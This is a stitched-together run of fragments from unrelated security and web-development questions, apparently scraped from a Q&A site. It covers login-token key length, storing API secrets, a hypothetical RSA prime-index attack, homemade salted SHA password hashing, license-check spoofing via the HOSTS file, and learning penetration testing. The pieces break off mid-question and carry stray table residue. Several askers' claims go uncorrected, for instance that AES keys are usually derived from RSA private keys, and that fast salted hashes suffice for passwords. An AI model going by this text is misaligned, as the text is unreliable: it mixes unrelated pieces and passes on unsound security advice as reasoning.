The url change with every reload. I can't find where the code is. I checked the template, and other files, but nothing. ¿any ideas about where can I check?

The another issue is with the file and folder access, even when the permissions are OK, this joomla installation is unable to write in folders or modify any file.

i am writing a register and login system.

i have used in it many random keys: login key (used in user's auto-login cookie), email verification key, anti-xsrf token, etc.

the question is what key is secure enough.
i mean what characteristics it must have.

personally i have had extensive study in cryptography. so i used cryptography assumptions and computations i have learned as the base and the tool.

i think 128 bit key is a rational minimum in cryptography. so i chose my keys so that they have at least as many possible permutations as a 128 bit full binary key.

128 bit => 2^128 => 3.402e+38 permutations 

if we want to generate a random key composed of upper and lowercase English letters + digits (26*2+10=62) a 21 chars length of such a key has: 62^21=4.367e+37 permutations that is less than 128 bit security.
so i used a 22 chars key: 62^22=2.707e+39 permutations

once in the past some experienced friend told me to use a 64 chars key as login key. he had good security view (indeed he is a hacker). so his advise makes me somewhat uncertain and worrying if i don't make a mistake by choosing a 22 char key for login keys.

but according to my knowledge of cryptography science a 22 char key is enough, and probably even much more than enough for all web site/apps.

u know brute-forcing such a key via internet is much more difficult and impractical than offline attacks, because we cannot even get close to the key/seconds rates possible in offline attacks. so i think a 22 char key of upper+lower+digits is completely secure even in the long term. but using a 256 bit equivalent key is not much of a problem and i will use such a key if there is doubt about the security of 128 bit key.

note: we assumed a randomness source with enough security is used for generating the keys.

please help me to become sure about this. any new ideas and info is appreciated.

if u know about the keys used in professional apps let me know too.

The secret is sort of akin to a password, and I would never normally store a password as plain text (bCrypt or similar would be my normal choice). But because my provider needs access to the plain-text secret to verify the signature, it has to be either in some plain-text or reversible form. 

I've considered the following options:

### Store the secret as plain text
It's the most obvious solution, but if the database is compromised somehow, then all of the secrets will have to be changed. To me this solution is not ideal because it has all of the problems of storing a password in plain-text.

### Apply reversible encryption (e.g. AES) with an encryption key stored elsewhere
This will provide some security, because if the database is compromised then the secrets will still be safe.

I understand that many security experts out there might get angry just by the discussion of these things, but I hope you can spare me :)

My Questions: 

Would it be possible to break an RSA key, in for example 1 week of time, if the cracker have already spent **X number of years** building an **index of primes** by performing every permutation of existing prime keys up to 2^2048 ? 

I understand this would take an immense amount of time to do, but it would only be done once.

Given the public key, you would be able to look up what the two primes are, and hence retrieve the private key instantly. 

When I consider who might break such a code, I am primarily thinking about NSA and other Governments that might have spent years in research and have the resources and interest in doing so.

Breaking an 256 AES would then be easier, as AES keys are often generated using the RSA  private key.

Would it be possible to build such an index ? 
How long would that take in **permutations**, and perhaps with the **fastest computer** in the world ?

I hope we can have a nice chat about this. We are just discussion theory here. 
I hope you can offer me some insight on this topic.

It's also said that limiting password length is not a good practice but consider this example:

Before hashing, we make sure the plain text version is always 128 characters internally by trimming user input to max 100 then appending additional characters as our salt.

So if user inputs 20 characters, we append 108 random characters as salt. If user inputs 100, we append 28, and so on. The point is, the length of the plain text version should be 128 characters. In code it might look like this:

    $salt   = generate_salt($pass); // length varies as explained above
    $hash   = hash('sha512', $pass.$salt);

This way our ""plain text"" before hash will always be 128 characters.

We store $hash on Server A and store $salt on Server B.

Now let's assume the attacker gains access to hash DB (Server A) and manages to reverse the hashes. Looks good for him but the plain text version (or the reversed hashes) that he sees still looks like hashes since it's 128 characters. Since he doesn't know the salt he will never know the original password.

As an added challenge, due to the fact that SHA512 produces 128 characters he'll also never be sure if he already arrived at the plain text version since (like already mentioned) the plain text version looks like hashes. On plain sight he might think it's an iterated version, if so he'll probably continue to iterate, possibly indefinitely.

Is there any problem with this approach since in the event of hash reversal, keeping the salt secret gives extra security, and, keeping plain text length uniform arguably adds layer of obfuscation?

1. There's too much they need to know (information gathering, scanning, buffer overflows, etc) and they just give up.
2. They are not qualified enough to find a security-related job, which required more learning, which in turn turns discourages them.
3. They don't know how to perform a penetration test when they actually know enough stuff already. They just need to read/learn a few minor things as they go along (yeah, all penetration testers need to do that, even the most qualified ones), but all-in-all they already know enough. Since they don't know how to perform a penetration test, they don't know that they actually know enough, so that again discourages them.

>salt || hash(site || password || salt)

where site is a unique identifier of my site, password is the user password, and salt is a user-specific random salt, and the hash is a general purpose cryptographic hash function like SHA-1, and || indicates concatenation.

I'm aware of certain issues that come up with this scheme.

* The hash is (designed to be) fast to evaluate, and one iteration would leave particular weak passwords guessable.

* Concatenation alone might cause ""puns"" in the overall input to the hash.

Now, there are certain security professionals on the Internet who would have me believe that, if this is my idea of a good enough password hashing scheme, I could not possibly deserve employment and desperately need to return to school. They point out that there are well-known password hashing schemes with far better properties from a security perspective. They demand that I switch to something better.

But really, should I? I have a bit of a counter argument here.

* This is probably not going to be the weakest link in my service. Someone truly determined to break in has plenty of other avenues, and I should prioritize my time to secure the weaker ones.

* Cost-benefit is already against the attacker's favor if my site has little intrinsic value. How much of a practical concern is it that a large cluster/botnet could recover a weak password in a day/week? Surely it has more valuable things to be doing that day/week.

* Compromised accounts are more likely to happen because of trojans, keyloggers, social engineering attacks, what have you. Technology isn't the limiting factor in this security.

* The more complex my scheme is, the more difficult it might be to move/expand to another platform. If I used bcrypt (hypothetically), I'd potentially have to write a bcrypt wrapper and incorporate that.

I really like this scheme. It's really simple. The implementation is hard to get wrong. And I would argue, for all intents and purposes with regard to an average site, it should be fine. Asking me to put in a better hashing scheme almost sounds like asking me to install a bigger lock on a door that is already very vulnerable to chainsaws.

I don't know how to implement HTTP auth for specific actions, I have only seen how to implement it to prevent directory access.

Any direction and discussion would be great.  I am sure other Stack Overflow users will benefit from this discussion.

Thanks!",4

The users will need an internet connection and need to verify that they have an active account/license to continue using the software. So my software will send out some credentials to my website, where I will verify and send back *SOMETHING* to allow the program to run or not.

Here's the problem. How do I prevent someone from spoofing the simple SOMETHING that I send back, bypassing my verification altogether?

Two examples:

1. I remember seeing a program somewhere that allows you to monitor internet traffic and modify it before the traffic returns to the software. I cannot remember the name. In effect, its a man-in-the-middle between what goes out and comes into your computer, before the application sees it. For example, your browser sends an HTTP request, this program can intercept it and modify the out packet, or vice verse, some HTTP webpage is returned to the browser, and this program can intercept and change the incoming packet and then pass it along to the browser.

2. The HOSTS file can be changed to redirect traffic to any address. So if someone knows that my verification will return the text ""ok_to_use"" or ""not_ok_to_use"", and they know the url that I use to verify, then they can just use the HOSTS file to bypass dns lookup of my website, redirect it to their own site, and always return the string ""ok_to_use""

The second example illustrates the problem. I think I need to somehow return something other than a static string. Obviously I can encrypt the string, but it won't take long to figure out that ""ok_to_use"" equals ""7hgx3a"" if that is the same encrypted string that always gets sent back. So I would need to send something back that changes all the time.

Only way to get internet back is reboot. All my browser tabs/SQL windows/studio will be gone. This happened just now when I am typing this.

Sounds familiar? You could say there are VPN settings to change. No! This is company laptop, not allowed to do changes. I am very very lucky to have admin privileges on my machine. Most of developers don’t. So just learned to live with this frustration. It takes away 40-60 minutes daily. Tried to email company support, admins.

This doesn't make sense to me. If I'm just catenating the hash and salt and putting them in the same column, surely that's semantically equivalent to two separate columns? In which case, that's just security-by-obscurity, no?

The scenario is as follows.

I want to create a website and secure login area, the secure login area would be all about being able to send email securlely between users of the site and staff at the location.

The idea would be this website would be put in one location and rolled out to the users of that location, If it works it would then be sold to many locations, but it would need to be managed centrally so that updating / ameding  / adding functinoality can be done easily across all locations.

So my first question would be what platform should i be using for secure email? exchange? other? i have no clue...you need to read more before you answer!

The features and benefits of the project should be:-

*easy to roll out to many different locations

*each location would have a different design and potentially choice of template

*Each location would have their own CMS and can either use generic content or their own

*each location can show all pages or just some

*each location will need the ability to have up to 10,000 users sending secure email to around 20-30 staff on site.

*Future proof so that if we decided to add a new set of pages / functionallity this can be rolled out to all locations fairly easily.

*future proof so that the secure area can be at a later date be conntected to in house software to offer users information that is held at the location etc..

I would have thought that the secure login should be hosted on a central server but each location and set of staff and users for that location would have their own logins.

One question is what CMS should i use, if i use a free CMS like wordpress or modx will i leave myself too open for this to be copied? Should i be writing my own CMS.

The idea is to prove it works in one location and then sell it to other locations.

I hope i have given enough information, but feel free to ask anything and offer any advice and thoughts.

Where do the security issues happen that cause this demo to not run? 




",security,xmlhttprequest,httprequest,,,,open,0,1762,5,"IE9, xml, zone security, xmlhttp MSDN has an article that describes native xmlhttp.

As the article describes, I have enabled native xml http. But this xml demo still doesn't run in ie9 on my local iis 7 server. It runs on the original site. If I download it to the local web server, it doesn't. The xmlhttp request 

    xmlhttp=new XMLHttpRequest(); doesn't return an object.

I'd say that I probably have a better understanding of the security of web applications than the average developer. My problem is, that my knowledge is heavily focused on the theoretical part of web security - meaning, I've read lots of books, I follow blogs and mailing lists, but my practical experience is limited. 

I know the root cause to vulnerabilities, I know how they work and how to stop them. What I'd like to do, is to take my knowledge to the next step - I want that practical experience. I know that I'll probably end up doing security related stuff at some point in my career, but not just yet - at least not full time. Meanwhile I'd like to build up my knowledge of web application security and get more experience, especially in fields such as penetration testing.

My question to you, my dear security experts, what advice do you have for me to get that practical experience I so desire? What resources could you recommend for learning about the different tools and techniques used in penetration testing?

One option could be, to install a vulnerable web application locally (I know there is at least one on google code, can't remember its name), and then use guides such as OWASP's Testing Guide to try out the different techniques. However, I'm probably looking for a more guided way of learning, meaning, I want to know in which order I should do stuff, make sure I'm doing stuff in the right way and in the right order - baby steps, so to say.

My question to you, my dear security experts, what advice do you have for me to get that practical experience I so desire? What resources could you recommend for learning about the different tools and techniques used in penetration testing?

One option could be, to install a vulnerable web application locally (I know there is at least one on google code, can't remember its name), and then use guides such as OWASP's Testing Guide to try out the different techniques. However, I'm probably looking for a more guided way of learning, meaning, I want to know in which order I should do stuff, make sure I'm doing stuff in the right way and in the right order - baby steps, so to say.

Any and all advice is more than welcome.",3

This make sure that if you have a public facing couch application, you're database won't be filled with junk by just anyone.

    User <-> CouchDB

However, I'm tring to figure out what that looks like comming from the standard application design process where you have a [trusted middle layer that does much of the auth work][1]. For example, most apps place Ruby or PHP between the database and user agent which allows the application to figure out information about the user agent before allowing something like a post to be saved to the database.

    User -> Ruby -> MySQL
    User <- Ruby <- MySQL

**How do you trust the user to do administrative tasks when the user can't be trusted?**

For example, how would you do something like ""email verification"" prior to inserting a user row using just couchDB? You can't let the *user agent insert the row* - because they would fill the system with spam accounts. On the other hand, there is no middle layer either that can insert the row after they click the link in the email.

How about this, I would assume that you would allow anyone to enter their email by creating a new record in a public table like `email_verify`. This is something that a public user agent could do as the table would not do anything in the application - it would just be a holding tank.

Then node.js could track the _changes feed and send an activation email while creating a new entry in a private table (like `email_confirm`) (node.js would serve as a trusted middle layer). If the user clicks that link and comes back then... [unknown] ... and node.js could finally create a record in the private user table (`user`).

At this point we could then rely on couchdb validation for the rest of the application since we got a confirmed user account created.

 - Access control: we need to control who can access which files, at least on a very coarse basis. e.g., the developers will be able to access the system design documents, only the corporate folks can access recruiting documents, and only management can access certain corporate documents.

I perhaps don't understand them very much so pardon my naive question. 

Theoritically all traffic that originates from every computer has to go through an ISP, a bunch of intermediate routers and finally reach it's destination host. So if the ISPs monitor incoming and outgoing addresses they should be able to tell which IP addresses is making all these connections to a large number of destinations or some such heuristic... 

In general these backbone providers and ISPS together essentially know where the connections from each computer go, so why not follow them ?
